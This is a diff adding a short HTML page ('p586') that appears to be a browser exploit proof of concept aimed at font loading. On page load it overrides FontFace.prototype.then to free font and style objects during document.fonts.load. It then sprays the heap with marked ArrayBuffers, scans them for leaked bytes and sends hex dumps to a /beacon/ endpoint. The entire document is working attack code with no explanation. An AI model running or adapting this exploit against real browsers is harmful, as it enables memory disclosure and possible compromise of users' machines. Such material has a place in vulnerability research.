@@ -1,0 +1,60 @@
+<!doctype html><html><head><meta charset="utf-8"><title>p586</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hx(v,i){var x=v[i];return ('0'+(x===undefined?0:x).toString(16)).slice(-2)}
+function dump(v,n){var s='';for(var i=0;i<n;i++)s+=hx(v,i);return s}
+var SIZES=[80,96,112,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+var styleEl=null, firedHere=false, MAP=[], seen={};
+function scanAll(tag){
+  for (var i=0;i<MAP.length;i++){
+    var e=MAP[i], v=e.view, nz=0, first=-1;
+    for (var o=0;o<e.size;o++){
+      if (o>=0x10 && o<=0x12) continue;
+      if (v[o]) { nz++; if (first<0) first=o; }
+    }
+    if (nz && !seen[i]){ seen[i]=1; b('P586-'+tag+'-HIT-s'+e.size+'-b'+i+'-nz'+nz+'-f'+first+'-'+dump(v,Math.min(e.size,80))); }
+  }
+  b('P586-'+tag+'-done-'+MAP.length);
+}
+function setup(){
+  var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded; window.__alive=[A];
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('P586-SETUP');
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e){}
+      styleEl=null;
+      document.body.offsetHeight;
+      MAP=[]; seen={};
+      for (var si=0; si<SIZES.length; si++)
+        for (var k=0;k<K;k++){
+          var v=new Uint8Array(new ArrayBuffer(SIZES[si]));
+          v[0x10]=0xBB; v[0x12]=k;
+          MAP.push({size:SIZES[si], view:v});
+        }
+      b('P586-SPRAYED-'+MAP.length);
+      try { document.fonts.check('1em s0'); } catch(e){}
+      b('P586-CHECK-RETURNED');
+      return undefined;
+    },
+    set:function(){}
+  });
+  b('P586-LOAD-CALLED');
+  document.fonts.load('1em f0, s0','AB').then(function(){ b('P586-RESOLVED'); },function(){ b('P586-REJECTED'); });
+  setTimeout(function(){ scanAll('T90'); },90);
+  setTimeout(function(){ scanAll('T300'); },300);
+  setTimeout(function(){ scanAll('T900'); },900);
+}
+function run(){ b('P586-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>p586</p></body></html>
